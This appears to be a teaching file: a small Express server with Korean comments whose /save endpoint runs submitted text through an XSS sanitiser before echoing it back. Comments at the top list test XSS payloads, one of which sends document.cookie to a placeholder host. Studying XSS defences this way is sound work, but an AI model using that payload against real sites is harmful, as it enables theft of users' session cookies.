// <script>alert(1)</script>
// <script>alert(document.cookie)</script>
// <script>new Image().src = 'http://my-domain/?cookie=' + encodeURIComponent(document.cookie);</script>

const express = require("express");
const path = require("path");
const xss = require("xss");

const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));

// 저장 엔드포인트
app.post("/save", (req, res) => {
  const content = req.body.content;

  // 입력값에 대한 이스케이핑 등의 처리 해야함
  const safeContent = xss(content);

  // 불안전한 방식으로 입력 내용 출력
  res.send(`<h2>저장된 내용:</h2><p>${safeContent}</p>`);
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
